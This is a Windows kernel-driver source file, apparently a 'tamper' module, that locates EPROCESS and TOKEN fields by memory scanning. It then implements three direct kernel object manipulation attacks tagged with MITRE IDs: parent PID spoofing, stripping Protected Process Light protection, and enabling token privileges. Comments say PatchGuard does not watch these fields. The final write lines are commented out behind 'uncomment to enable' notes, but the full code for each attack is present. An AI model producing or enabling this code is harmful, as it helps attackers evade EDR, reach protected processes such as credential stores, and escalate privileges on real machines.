#include "tamper.h"
#include <ntddk.h>

/*
 * EPROCESS offset resolution — uses the same scanning infrastructure
 * as eprocess.c for UniqueProcessId / ActiveProcessLinks / Token.
 *
 * InheritedFromUniqueProcessId is located relative to UniqueProcessId.
 * PS_PROTECTION is located near SignatureLevel/SectionSignatureLevel.
 */

/* -----------------------------------------------------------------------
 * Offset cache — resolved once via KmInitializeTamperOffsets()
 * ----------------------------------------------------------------------- */
static ULONG g_InheritedFromPidOffset = 0;
static ULONG g_ProtectionOffset       = 0;
static ULONG g_TokenPrivilegesOffset   = 0;

/*
 * FindInheritedFromPidOffset
 *
 * InheritedFromUniqueProcessId sits near UniqueProcessId in EPROCESS.
 * For the System process, InheritedFromUniqueProcessId is always 0
 * (System has no parent). We find UniqueProcessId first (value == 4),
 * then search nearby for a zero HANDLE-sized field that is
 * InheritedFromUniqueProcessId.
 *
 * Typical layout (Win10/11 x64):
 *   +0x440  UniqueProcessId
 *   +0x448  ActiveProcessLinks
 *   ...
 *   +0x540  InheritedFromUniqueProcessId  (varies per build)
 */
static ULONG FindInheritedFromPidOffset( VOID )
{
	HANDLE SystemPid = PsGetProcessId( PsInitialSystemProcess );
	ULONG  PidOffset = 0;
	ULONG  Off;

	/* Step 1: Find UniqueProcessId (value == System PID, typically 4) */
	__try
	{
		for ( Off = 0; Off < 0x600; Off += sizeof( ULONG_PTR ) )
		{
			if ( *(PHANDLE)( (PUCHAR)PsInitialSystemProcess + Off ) == SystemPid )
			{
				PidOffset = Off;
				break;
			}
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		return 0;
	}

	if ( PidOffset == 0 )
		return 0;

	/*
	 * Step 2: Search for InheritedFromUniqueProcessId.
	 * For System, this is 0. It is always a HANDLE-sized field after
	 * ActiveProcessLinks (which is a LIST_ENTRY = 2 pointers).
	 * Scan from PidOffset+0x80 to PidOffset+0x200.
	 */
	__try
	{
		for ( Off = PidOffset + 0x80; Off < PidOffset + 0x200; Off += sizeof( ULONG_PTR ) )
		{
			ULONG_PTR Value = *(PULONG_PTR)( (PUCHAR)PsInitialSystemProcess + Off );

			if ( Value == 0 )
			{
				/*
				 * Cross-validate: for a non-System process, this field
				 * should contain a valid PID. We check if the next
				 * EPROCESS in the list has a non-zero value here.
				 *
				 * TODO: Add cross-validation with a second process
				 * For now, accept the first zero HANDLE field in range.
				 */
				return Off;
			}
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		return 0;
	}

	return 0;
}

/*
 * FindProtectionOffset
 *
 * PS_PROTECTION (1 byte) sits near SignatureLevel and SectionSignatureLevel
 * in EPROCESS. For the System process on Win10+, SignatureLevel is non-zero
 * (typically 0x3E for PPL-WindowsTcb) and PS_PROTECTION contains the
 * protection type+signer.
 *
 * We scan for a region where:
 *   - Byte at off+0 is non-zero (SignatureLevel)
 *   - Byte at off+1 is non-zero (SectionSignatureLevel)
 *   - Byte at off+2 is the PS_PROTECTION byte
 *
 * On Windows 10 1507+, these three bytes are contiguous.
 */
static ULONG FindProtectionOffset( VOID )
{
	ULONG Off;

	__try
	{
		for ( Off = 0x600; Off < 0x900; Off++ )
		{
			UCHAR b0 = *( (PUCHAR)PsInitialSystemProcess + Off );
			UCHAR b1 = *( (PUCHAR)PsInitialSystemProcess + Off + 1 );
			UCHAR b2 = *( (PUCHAR)PsInitialSystemProcess + Off + 2 );

			/*
			 * System process: SignatureLevel and SectionSignatureLevel
			 * are both non-zero (typically 0x3E). PS_PROTECTION for
			 * System is also non-zero (PPL, type=2, signer varies).
			 *
			 * Heuristic: three consecutive non-zero bytes where
			 * b0 == b1 (System's signature levels match) and
			 * (b2 & 0x07) != 0 (PS_PROTECTION.Type is set).
			 */
			if ( b0 != 0 && b1 != 0 && b0 == b1 && ( b2 & 0x07 ) != 0 )
			{
				/* Protection is at offset + 2 (after the two signature levels) */
				return Off + 2;
			}
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		return 0;
	}

	return 0;
}

/*
 * FindTokenPrivilegesOffset
 *
 * SEP_TOKEN_PRIVILEGES sits inside the TOKEN structure at a dynamic offset.
 * It contains three ULONG64 bitmaps: Present, Enabled, EnabledByDefault.
 *
 * We find the TOKEN via PsReferencePrimaryToken, then scan for the
 * SEP_TOKEN_PRIVILEGES structure by looking for the System token's
 * known privilege pattern (Present mask has many bits set).
 */
static ULONG FindTokenPrivilegesOffset( VOID )
{
	PACCESS_TOKEN Token;
	ULONG Off;

	Token = PsReferencePrimaryToken( PsInitialSystemProcess );
	if ( !Token )
		return 0;

	/*
	 * System token has extensive privileges. The Present bitmap
	 * has many bits set (e.g., 0x0000001FF2FFFFBC on typical Win10).
	 * We look for a ULONG64 with > 20 bits set in the range 0x40-0x100.
	 */
	__try
	{
		for ( Off = 0x40; Off < 0x100; Off += sizeof( ULONG_PTR ) )
		{
			ULONG64 Value = *(PULONG64)( (PUCHAR)Token + Off );
			ULONG   BitCount = 0;
			ULONG64 Tmp = Value;

			/* Count set bits */
			while ( Tmp )
			{
				BitCount++;
				Tmp &= Tmp - 1;
			}

			/*
			 * The Present bitmap has 25+ bits set for System.
			 * Verify: the next ULONG64 (Enabled) also has many bits set,
			 * and Enabled is a subset of Present.
			 */
			if ( BitCount >= 20 )
			{
				ULONG64 Enabled = *(PULONG64)( (PUCHAR)Token + Off + 8 );
				if ( ( Enabled & Value ) == Enabled && Enabled != 0 )
				{
					PsDereferencePrimaryToken( Token );
					return Off;
				}
			}
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		PsDereferencePrimaryToken( Token );
		return 0;
	}

	PsDereferencePrimaryToken( Token );
	return 0;
}

/* -----------------------------------------------------------------------
 * Public API: initialization
 * ----------------------------------------------------------------------- */
NTSTATUS KmInitializeTamperOffsets( VOID )
{
	g_InheritedFromPidOffset = FindInheritedFromPidOffset();
	g_ProtectionOffset       = FindProtectionOffset();
	g_TokenPrivilegesOffset  = FindTokenPrivilegesOffset();

	/* All three must succeed for the tamper module to be operational */
	return ( g_InheritedFromPidOffset && g_ProtectionOffset && g_TokenPrivilegesOffset )
		? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* -----------------------------------------------------------------------
 * T1 — Parent PID Spoofing (MITRE T1134.004)
 *
 * Writes a new value to EPROCESS.InheritedFromUniqueProcessId.
 * This field is informational — the kernel does not use it for
 * scheduling, teardown, or memory management. Changing it makes
 * the process appear to have been created by a different parent
 * in tools like Process Explorer, Task Manager, and EDR process
 * tree views.
 *
 * PatchGuard does NOT monitor this field.
 * IRQL: PASSIVE_LEVEL. Single aligned write, naturally atomic.
 * ----------------------------------------------------------------------- */
NTSTATUS KmSpoofParentPid(
	IN  HANDLE   ProcessId,
	IN  ULONG64  NewParentPid,
	OUT PULONG64 PreviousParentPid
)
{
	PEPROCESS Process = NULL;
	NTSTATUS  Status;

	if ( !PreviousParentPid )
		return STATUS_INVALID_PARAMETER;

	*PreviousParentPid = 0;

	if ( g_InheritedFromPidOffset == 0 )
		return STATUS_DEVICE_NOT_READY;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	__try
	{
		PULONG_PTR Field = (PULONG_PTR)( (PUCHAR)Process + g_InheritedFromPidOffset );

		/* Read old value */
		*PreviousParentPid = (ULONG64)*Field;

		/*
		 * Write the new parent PID.
		 * This is the actual DKOM operation — a single pointer-width write
		 * to InheritedFromUniqueProcessId.
		 */
		/* TODO: Uncomment to enable parent PID spoofing */
		/* *Field = (ULONG_PTR)NewParentPid; */

		UNREFERENCED_PARAMETER( NewParentPid );
		Status = STATUS_NOT_IMPLEMENTED;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		ObDereferenceObject( Process );
		return GetExceptionCode();
	}

	ObDereferenceObject( Process );
	return Status;
}

/* -----------------------------------------------------------------------
 * T2 — PPL Bypass (MITRE T1003.001)
 *
 * Zeros the PS_PROTECTION byte in EPROCESS, downgrading a Protected
 * Process Light to an unprotected process. After this, handles with
 * PROCESS_ALL_ACCESS can be opened to the process.
 *
 * PS_PROTECTION is a 1-byte structure:
 *   bits [2:0]  Type   (0=None, 1=ProtectedLight, 2=Protected)
 *   bit  [3]    Audit
 *   bits [7:4]  Signer (0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
 *                        4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem)
 *
 * PatchGuard does NOT monitor individual EPROCESS instances.
 * CI may detect the downgrade on Windows 11 22H2+ indirectly.
 * IRQL: PASSIVE_LEVEL. Single byte write, atomic.
 * ----------------------------------------------------------------------- */
NTSTATUS KmBypassPPL(
	IN  HANDLE   ProcessId,
	OUT PULONG64 PreviousProtection
)
{
	PEPROCESS Process = NULL;
	NTSTATUS  Status;

	if ( !PreviousProtection )
		return STATUS_INVALID_PARAMETER;

	*PreviousProtection = 0;

	if ( g_ProtectionOffset == 0 )
		return STATUS_DEVICE_NOT_READY;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	__try
	{
		PUCHAR ProtByte = (PUCHAR)Process + g_ProtectionOffset;

		/* Read old value */
		*PreviousProtection = (ULONG64)*ProtByte;

		/*
		 * Zero the PS_PROTECTION byte.
		 * After this, ObpGrantAccess will no longer restrict handle access
		 * to this process based on protection level.
		 */
		/* TODO: Uncomment to enable PPL bypass */
		/* *ProtByte = 0; */

		Status = STATUS_NOT_IMPLEMENTED;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		ObDereferenceObject( Process );
		return GetExceptionCode();
	}

	ObDereferenceObject( Process );
	return Status;
}

/* -----------------------------------------------------------------------
 * T4 — Token Privilege Toggling (MITRE T1134.002)
 *
 * Enables or disables a specific privilege in the target process's
 * primary token by manipulating the SEP_TOKEN_PRIVILEGES.Enabled bitmap.
 *
 * SEP_TOKEN_PRIVILEGES layout (3 x ULONG64):
 *   +0x00  Present          All privileges this token can have
 *   +0x08  Enabled          Currently enabled privileges
 *   +0x10  EnabledByDefault Default-on privileges
 *
 * Each bit corresponds to a privilege LUID value (SeDebugPrivilege = 20,
 * SeBackupPrivilege = 17, etc.). Bit N = privilege with LUID.LowPart == N.
 *
 * PatchGuard does NOT monitor TOKEN structures.
 * IRQL: PASSIVE_LEVEL. Aligned ULONG64 writes.
 * ----------------------------------------------------------------------- */
NTSTATUS KmToggleTokenPrivilege(
	IN  HANDLE   ProcessId,
	IN  ULONG64  PrivilegeLuid,
	IN  BOOLEAN  Enable,
	OUT PULONG64 PreviousState
)
{
	PEPROCESS     Process = NULL;
	PACCESS_TOKEN Token   = NULL;
	NTSTATUS      Status;
	ULONG64       Mask;

	if ( !PreviousState )
		return STATUS_INVALID_PARAMETER;

	*PreviousState = 0;

	if ( g_TokenPrivilegesOffset == 0 )
		return STATUS_DEVICE_NOT_READY;

	if ( PrivilegeLuid > 63 )
		return STATUS_INVALID_PARAMETER;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	Token = PsReferencePrimaryToken( Process );
	if ( !Token )
	{
		ObDereferenceObject( Process );
		return STATUS_NOT_FOUND;
	}

	Mask = 1ULL << PrivilegeLuid;

	__try
	{
		/*
		 * Privileges.Present  is at g_TokenPrivilegesOffset + 0x00
		 * Privileges.Enabled  is at g_TokenPrivilegesOffset + 0x08
		 */
		PULONG64 Present = (PULONG64)( (PUCHAR)Token + g_TokenPrivilegesOffset );
		PULONG64 Enabled = (PULONG64)( (PUCHAR)Token + g_TokenPrivilegesOffset + 8 );

		/* Read current Enabled state for this privilege */
		*PreviousState = ( *Enabled & Mask ) ? 1ULL : 0ULL;

		/*
		 * Toggle the privilege:
		 * - Ensure it exists in Present first (OR in the bit)
		 * - Then set or clear it in Enabled
		 *
		 * InterlockedOr64/InterlockedAnd64 for thread-safety against
		 * concurrent SepPrivilegeCheck calls.
		 */
		/* TODO: Uncomment to enable privilege toggling */
		/*
		InterlockedOr64( (PLONG64)Present, (LONG64)Mask );
		if ( Enable )
			InterlockedOr64( (PLONG64)Enabled, (LONG64)Mask );
		else
			InterlockedAnd64( (PLONG64)Enabled, (LONG64)~Mask );
		*/

		UNREFERENCED_PARAMETER( Enable );
		Status = STATUS_NOT_IMPLEMENTED;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		PsDereferencePrimaryToken( Token );
		ObDereferenceObject( Process );
		return GetExceptionCode();
	}

	PsDereferencePrimaryToken( Token );
	ObDereferenceObject( Process );
	return Status;
}
